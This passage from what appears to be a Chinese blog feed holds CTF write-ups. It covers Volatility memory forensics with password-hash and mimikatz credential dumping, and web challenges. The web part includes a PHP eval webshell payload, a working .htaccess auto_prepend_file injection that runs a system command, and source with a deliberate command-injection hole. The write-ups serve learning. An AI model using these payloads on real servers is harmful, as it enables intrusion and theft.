class="hljs-number">5</span>+FfxJH/<span class="hljs-number">2</span>aSZppNT6fShhcN7ZTqkywAAAAMBAAEAAAGAdfojEsorxpKKPRLX8PbnPb52xD<br>C46x7Jfmu0iaWKcRz4iEjsrHvhg1JiBxEGmW/<span class="hljs-number">992</span>cUSHw6Ck1trq6CcTlF4PzuEVPnNKf0<br><span class="hljs-number">0</span>ma<span class="hljs-regexp">/WlTD/</span>DkX5Qe7xRqCaNw+uJVqO0utEceWLp7595l6eD+<span class="hljs-number">3</span>GJ77u9x96vcIba3ZoKUIPJ<br>UqrUNibEvRMFoy7oX3eBJWiFWK+P4gr6YG6HsNUJKDyE2WJKUSP+pogwoo<span class="hljs-regexp">/d0Qg7I/</span>VBVK<br>N39PFnwUG5wcNP5EHezqWQVVln<span class="hljs-regexp">/dltDgOc5IldknTRt4Q3NDrSyNsRpv0EYI2gz+yRu/</span>IE<br>RR9PHYjH5l6uYwowW34iGi<span class="hljs-regexp">/xloSxG5bDEWOe0eEANCjowiYYrmTLffIQ/</span>AU9w4te/+eWd2<br>WV56LUuC6k4mEdNhtljMZR/<span class="hljs-number">0</span>A+C5EkPzgsTEJEmYLYvqrNejM7Y1UKz3+YZ8m8rT4XcNmf<br>j5wfJd1TbCu0hB5kZC1DkybYQaMRNnZ3+PjwU2hZBTuh02F787nG5NFkpI96qkWxTBAAAA<br>wBdaxLNzl<span class="hljs-regexp">/7Dig/</span>neTUAQLa<span class="hljs-regexp">/C1F2cpQt6RcJbzHodgxm8n75a/</span>wdRI4/oCvGJkRgyAnyCE<br>tgfMnTQ4opmHf5k0U0R/wmCGivcGhg5KIBSSnp9mWt6qclJ8O6vZ5L3rKIgreWzGUDk8IT<br>W3Lcl5EO0sskpVvp65xncEdv3CefxXVTlkgp4PXgXcxPao633hWA6TAm2zZx7R6fJt0Ex4<br>x3lVG68ghRE/ZFbF48s8Gy+zRDyA5JEGPWxWddO623IVgG6AAAAMEAyX4CJKSxE5gvJdrw<br>lhx8dBbVQxw06fPoVlu<span class="hljs-regexp">/z/</span>JTwkPdliuAdp30SV8WbmXUhLvv457WdqAMCwlGs/<span class="hljs-number">7</span>xrCW21U<br><span class="hljs-number">84</span>+VeD9aGM61nSsT7kUzGjdvbjQiHCmys7dwuy/thCrpWFTxI4fjOEYHc3N8S+hBHQRJKk<br>mEYyBoI3eJ3NhUsGHr1V4LONBKkoUZyC+LjKev06m9qM6R0/<span class="hljs-number">0</span>k4cB09pkDVinuFuGk5iDy<br>YKyjAGiAxFI9ACiZ5NLKTsdaEqtCPfAAAAwQDFAXbSxwbLYWDacBNUm4E7FZsYKkqoIAWQ<br><span class="hljs-number">3</span>uEQP5Sp7GrCU5dWraGB2wOkX+irMYGDfTk5qG8NLyYoSKVIZwA6ijDliWekL6XdPGJfKK<br><span class="hljs-number">7</span>xw64Nx6syc7oD7scSzTGNH0m1z+T2rjP3dMDDVhYMHksYcSxikyHNzLR9Z51hCOHeKb1O<br><span class="hljs-number">8</span>LNW4IrC6AYeXt8sHizSLIagncOuPtSkKiGdR5fn65fHomMzaVQsSJYvwNeSrKXu36NSJm<br><span class="hljs-number">27</span>AuL6DDE2vJUAAAAUc29uZzU1MjA4NTEwN0BxcS5jb20BAgMEBQYH<br>-----<span class="hljs-keyword">END</span> OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>解base64后<br><code>song552085107@qq.com</code><br>在Github上搜索此用户，找到关键项目：<br><a href="https://github.com/Ha1f00L/whatsthat">https://github.com/Ha1f00L/whatsthat</a><br>访问后下载项目中的__APP__，在其中可以找到：<br>U2FuZ0ZvcntTMF8zYXp5XzJfY3JhY2tfbm9vYl9wbGF5ZXJ9<br>base64解码后就得到了flag  ：<code>SangFor&#123;S0_3azy_2_crack_noob_player&#125;</code></p><h2 id="hgame2022week4"><a href="#hgame2022week4" class="headerlink" title="hgame2022week4"></a>hgame2022week4</h2><h3 id="ezWin-variables"><a href="#ezWin-variables" class="headerlink" title="ezWin - variables"></a>ezWin - variables</h3><p>题目这个<code>variables</code>是啥变量，猜测是环境变量<br>使用命令<br><code>python3 vol.py -f /home/kali/桌面/win10_22h2_19045.2486.vmem envars</code><br>翻找到一个环境变量<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/6.png"></p><h3 id="ezWin-7zip"><a href="#ezWin-7zip" class="headerlink" title="ezWin - 7zip"></a>ezWin - 7zip</h3><p><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/7.png"><br><code>python3 vol.py -f /home/kali/桌面/win10_22h2_19045.2486.vmem filescan &gt; 1.txt</code><br>查看文件<br>打开1.txt检索flag发现存在flag.7z文件<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/8.png"><br>提取这个文件<br><code>python3 vol.py -f ../win10_22h2_19045.2486.vmem dumpfiles --virtaddr 0xd0064181c950 </code><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/9.png"><br>得到<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/10.png"><br>发现需要密码<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/11.png"><code>![](/wp/内存取证/12.png) 文件名给了提示 nt_hash 是Ntlm hash 里面有用户名和密码 `python3 vol.py -f ../win10_22h2_19045.2486.vmem windows.hashdump ` 这里一开始尝试的时候报错了 ![](/wp/内存取证/13.png) 原因是pip安装不了snappy-dev库 前面安装环境的时候` pip3 install -r requirements.txt `报错</code><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/14.png"><br>然后就跑出账号密码了<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/15.png"><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/16.png"><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/17.png"><br><code>hgame&#123;e30b6984-615c-4d26-b0c4-f455fa7202e2&#125;</code></p><h3 id="ezWin-auth"><a href="#ezWin-auth" class="headerlink" title="ezWin - auth"></a>ezWin - auth</h3><p><code>python3 vol.py -f ../win10_22h2_19045.2486.vmem windows.cmdline</code><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/18.png"><br>一开始没啥思路，就先做了第3题，没想到这题flag是下一题的key<br><code>python3 vol.py -f ../win10_22h2_19045.2486.vmem windows.hashdump</code><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/19.png"><br><code>hgame&#123;84b0d9c9f830238933e7131d60ac6436&#125;</code></p><h2 id="Byte-Bandits-CTF-2023"><a href="#Byte-Bandits-CTF-2023" class="headerlink" title="Byte Bandits CTF 2023"></a>Byte Bandits CTF 2023</h2><p>这里比赛的时候队友已经做了，我就直接偷wp，不自己写了</p><h3 id="Memory-Dump"><a href="#Memory-Dump" class="headerlink" title="Memory Dump"></a>Memory Dump</h3><p>题目说明：<br>I was learning powershell when my pc suddenly crashed. Can you retrieve my bash history?</p><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>之前长安杯做过PowerShell的取证题，PowerShell历史命令文件路径为<br><code>%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code><br>所以我们直接去filescan<code>ConsoleHost_history.txt</code><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/20.png"><br> dump一下<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/21.png"><br>cat 一下下<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/22.png"><br>AES解密即可<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/23.png"></p><h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>因为<code>ConsoleHost_history.txt</code>为文本形式，所以利用strings转换一下直接搜索<code>flag&#123;</code>即可<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/24.png"></p><h3 id="Imageception"><a href="#Imageception" class="headerlink" title="Imageception"></a>Imageception</h3><p>题目说明 ：<br>“The painter has the universe in his mind and hands.”<br>-Leonardo Da Vinci<br>题目名称为imageception，所以直接FileScan搜索<br><code>python vol.py -f ./BBCTF/Imageception.raw windows.filescan.FileScan | grep &quot;imageception&quot;</code><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/25.png"><br>发现有个<code>imageception.png</code> 把他dump下来<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/26.png"><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/27.png"></p><h2 id="陇剑杯-2021-内存分析"><a href="#陇剑杯-2021-内存分析" class="headerlink" title="[陇剑杯 2021]内存分析"></a>[陇剑杯 2021]内存分析</h2><p>tips：<code>no space but underline</code></p><h3 id="问1"><a href="#问1" class="headerlink" title="问1"></a>问1</h3><p>网管小王制作了一个虚拟机文件，让您来分析后作答： 虚拟机的密码是_____________。（密码中为flag{xxxx}，含有空格，提交时不要去掉）<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/28.png"><br><code>volatility -f /home/kali/桌面/Target.vmem  --profile=Win7SP1x64_23418 lsadump</code><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/29.png"><br>也可以用mimikatz插件<br><code>volatility -f Target.vmem --profile=Win7SP1x64 mimikatz</code></p><h3 id="问2"><a href="#问2" class="headerlink" title="问2"></a>问2</h3><p>网管小王制作了一个虚拟机文件，让您来分析后作答： 虚拟机中有一个某品牌手机的备份文件，文件里的图片里的字符串为_____________。（解题过程中需要用到上一题答案中flag{}内的内容进行处理。本题的格式也是flag{xxx}，含有空格，提交时不要去掉）。<br>图片要找文件<br><code>volatility -f /home/kali/桌面/Target.vmem  --profile Win2008R2SP1x64_23418 filescan</code><br>找到带华为的文件<br><code>volatility -f /home/kali/桌面/Target.vmem  --profile Win2008R2SP1x64_23418 dumpfiles -Q 0x000000007d8c7d10 -D /home/kali/桌面</code><br>dump下来<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/30.png"><br>改后缀dat为exe<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/31.png"><br>得到一个文件夹，里面是加密的<br>华为备份文件解密工具：<br><code>[https://github.com/RealityNet/kobackupdec](https://github.com/RealityNet/kobackupdec)</code><br>注意：<br><code>&quot;C:Desktop\kobackupdec-master\...&quot;</code>为上面解压出来的文件夹路径，<code>&quot;C:Desktop\kobackupdec-master\backup&quot;</code>要在命令添加<code>backup</code>来储存解密后的文件<br><code> python kobackupdec.py -vvv &quot;W31C0M3_T0_THiS_34SY_F0R3NSiCX&quot; &quot;C:Desktop\kobackupdec-master\...&quot; &quot;C:Desktop\kobackupdec-master\backup&quot;</code><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/32.png"><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/33.png"><br><code>flag&#123;TH4NK Y0U FOR DECRYPTING MY DATA&#125;</code></p><h2 id="HUBUCTF-2022-新生赛-vmem"><a href="#HUBUCTF-2022-新生赛-vmem" class="headerlink" title="HUBUCTF 2022 新生赛-vmem"></a>HUBUCTF 2022 新生赛-vmem</h2><p>内存取证，vol3文件dump不下来，只能用vol2<br>vol2安装：<a href="https://blog.csdn.net/qq_42947816/article/details/119395804">https://blog.csdn.net/qq_42947816/article/details/119395804</a><br><code>volatility -f /home/kali/桌面/Windows7.vmem imageinfo</code><br><img src="/wp/vmem/1.png"><br><code>volatility -f /home/kali/桌面/Windows7.vmem --profile=Win2008R2SP1x64_23418 filescan|grep &#39;flag</code><br><img src="/wp/vmem/2.png"><br>提取文件<br><code>volatility -f /home/kali/桌面/Windows7.vmem --profile=Win2008R2SP1x64_23418 dumpfiles -Q 虚拟地址 -D 保存位置</code><br>如：<br><code>volatility -f /home/kali/桌面/Windows7.vmem --profile=Win2008R2SP1x64_23418 dumpfiles -Q 0x000000005eb84f20 -D /home/kali/桌面/1</code><br>flag1：<br><code>the first part of flag is : NSSCTF&#123;W0w_y0u_G3t</code><br>flag2：<br><img src="/wp/vmem/3.png"><br>flag3：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">flag3 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag3.txt&#x27;</span>).read()<br>flag_enc = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag3)):<br>    flag_enc += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(flag3[i]) ^ <span class="hljs-number">0xf</span> - <span class="hljs-number">6</span>)<br><span class="hljs-built_in">print</span>(flag_enc)<br><span class="hljs-comment"># &#125;al):&#123;m)yh&#123;&#125;)fo)oehn)`z)3)VPF|V^hg](t </span><br></code></pre></td></tr></table></figure><p>异或一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">enc=<span class="hljs-string">&#x27;&#125;al):&#123;m)yh&#123;&#125;)fo)oehn)`z)3)VPF|V^hg](t&#x27;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(enc[i]) ^ <span class="hljs-number">0xf</span> - <span class="hljs-number">6</span>)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#the 3rd part of flag is : _YOu_WanT!&#125;                </span><br></code></pre></td></tr></table></figure><h2 id="NSSRound-1-Basic-cut-into-thirds"><a href="#NSSRound-1-Basic-cut-into-thirds" class="headerlink" title="NSSRound#1 Basic]cut_into_thirds"></a>NSSRound#1 Basic]cut_into_thirds</h2><p>题目说明：华强觉得这flag不甜，就把flag刀成了三份，分给了“基地”家族的老二、老四和老六。请将找到的三块按顺序用“-”连接，flag格式为NSSCTF{uuid}<br><code>volatility -f /home/kali/桌面/cut_into_thirds.raw --profile=Win7SP1x64 pslist</code><br>列出当前进程<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/34.png"><br><code>volatility -f /home/kali/桌面/cut_into_thirds.raw --profile=Win7SP1x64 procdump -p 1164 -D /home/kali/桌面/</code><br>运行一下导出的程序<code>part2:GRRGGYJNGQ4GKMBNMJRTONI=</code><br>base32：<code>4bca-48e0-bc75</code><br><code>volatility -f /home/kali/桌面/cut_into_thirds.raw --profile=Win7SP1x64 filescan</code><br>由前面知道可疑文件<br><code>0x0000000012191a20     16      0 R--rw- \Device\HarddiskVolume2\Users\CTF\Desktop\LookAtMe.zip</code><br>dump下来<br><code>part1:3930653363343839</code><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/35.png"><br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/36.png"><br>lsa解密不成功<br>我mimikatz没装成功，呜呜呜太菜了<br><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/37.png"><br><code>MTEwOTFmNWI3ZTNh</code> -&gt; base64：<code>11091f5b7e3a</code><br><code>NSSCTF&#123;90e3c489-4bca-48e0-bc75-11091f5b7e3a&#125;</code></p><h2 id="蓝帽杯-2022-初赛-计算机取证"><a href="#蓝帽杯-2022-初赛-计算机取证" class="headerlink" title="[蓝帽杯 2022 初赛]计算机取证"></a>[蓝帽杯 2022 初赛]计算机取证</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p><code>现对一个windows计算机进行取证，请您对以下问题进行分析解答。 从内存镜像中获得taqi7的开机密码是多少？</code></p><p><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/8ac.png"></p><p><code>7f21caca5685f10d9e849cc84c340528</code> </p><p><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/38.png"></p><p>也可以用Passware Kit Forensic </p><p><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/39.png"></p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><code>现对一个windows计算机进行取证，请您对以下问题进行分析解答。 制作该内存镜像的进程Pid号是多少？</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">volatility -f <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/桌面/</span><span class="hljs-number">1</span>.dmp --profile=Win7SP1x64_23418 pslist<br></code></pre></td></tr></table></figure><p><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/40.png"></p><p>MagnetRAMCaptu是镜像制作工具，该进程pid为2192</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">现对一个windows计算机进行取证，请您对以下问题进行分析解答。</span><br><span class="language-xml">bitlokcer分区某office文件中存在的flag值为？（答案参考格式：NSSCTF</span><span class="hljs-template-variable">&#123;abcABC123&#125;</span><span class="language-xml">）</span><br></code></pre></td></tr></table></figure><p>在取证大师内存分析工具可以导出1.dmp的Bitlocker key密钥<img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/41.png"></p><p>利用这个密钥可以解码G.E01文件，取证大师有解密工具</p><p>得到：</p><p><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/42.png"></p><p>然后利用里面的pass.txt字典来爆出文件密钥</p><p><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/43.png"></p><p>打开得到</p><p><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/44.png"></p><p><strong>flag{b27867b66866866686866883bb43536}</strong></p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf">现对一个windows计算机进行取证，请您对以下问题进行分析解答。<br>TrueCrypt加密中存在的<span class="hljs-built_in">flag</span>值为？<br></code></pre></td></tr></table></figure><p>取证大师</p><p><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/45.png"></p><p>挂载加密文件并解密</p><p><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/46.png"></p><p>得到：</p><p><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/47.png"></p><p>爆破一下</p><p><img src="/wp/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/48.png"></p><p>flag{1349934913913991394cacacacacacc}</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>羊城杯 2020-web</title>
    <link href="/2023/02/21/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020-web/"/>
    <url>/2023/02/21/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020-web/</url>
    
    <content type="html"><![CDATA[<h1 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h1><p>御剑<br><img src="/wp/ycb2020/1.png"><br><img src="/wp/ycb2020/2.png"></p><p><img src="/wp/ycb2020/3.png"><br>或者连antsward<br>base64转图片<br><a href="https://tool.jisuapi.com/base642pic.html">https://tool.jisuapi.com/base642pic.html</a><br><img src="/wp/ycb2020/4.png"></p><h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;on&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;html&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;type&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;flag&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;upload&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;file&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[^a-z\.]/&quot;</span>, <span class="hljs-variable">$filename</span>) == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span> . <span class="hljs-string">&quot;\nHello, world&quot;</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><code>file_put_contents($filename, $content . &quot;\nHello, world&quot;);</code><br>想到可以传木马，<code>$filename</code>传文件名<code>$content</code>传木马，但是后面拼接了个<code>\nHello, world</code><br><code>?content=&lt;?php eval($_POST[&#39;a&#39;]);?&gt;&amp;filename=a.php</code><br><img src="/wp/ycb2020/5.png"><br>被当html解析<br>然后<br><code>if ($file !== &quot;index.php&quot;) &#123;unlink($file); &#125;</code>限制了页面在index.php<br>php_value auto_prepend_file：<a href="https://www.php.cn/php-weizijiaocheng-293703.html">https://www.php.cn/php-weizijiaocheng-293703.html</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">php_value auto_prepend_fil\ <br>e .htaccess <br><span class="hljs-comment">#&lt;?php system(&#x27;cat /fla&#x27;.&#x27;g&#x27;);?&gt;\</span><br><br></code></pre></td></tr></table></figure><p><code>#是.hatccess文件的写入形式</code><br>在php执行时#后的语句同样会被解析,反斜杠绕过file过滤<br>末尾的\转义掉<code>\nHello, world</code>的换行<br>相当于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">php_value auto_prepend_fil\ <br>e .htaccess <br><span class="hljs-comment">#&lt;?php system(&#x27;cat /fla&#x27;.&#x27;g&#x27;);?&gt;nHello, world</span><br><br></code></pre></td></tr></table></figure><p>需要对一些符合url编码，因为get传参，需要编码两次<br><code>?filename=.htaccess&amp;content=php_value%20auto_prepend_fil%5C%0Ae%20.htaccess%0A%23%3C%3Fphp%20system(&#39;cat%20/f*&#39;)%3B%3F%3E%5C</code><br><img src="/wp/ycb2020/6.png"></p><h1 id="Blackcat"><a href="#Blackcat" class="headerlink" title="Blackcat"></a>Blackcat</h1><p>源码在mp3里面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>]))&#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$clandestine</span> = <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;clandestine&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;White-cat-monitor&#x27;</span>]))<br>  <span class="hljs-variable">$clandestine</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;White-cat-monitor&#x27;</span>], <span class="hljs-variable">$clandestine</span>);<br><br><br><span class="hljs-variable">$hh</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>], <span class="hljs-variable">$clandestine</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$hh</span> !== <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;nc&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>]);<br><br></code></pre></td></tr></table></figure><p>最终目的是通过<code>echo 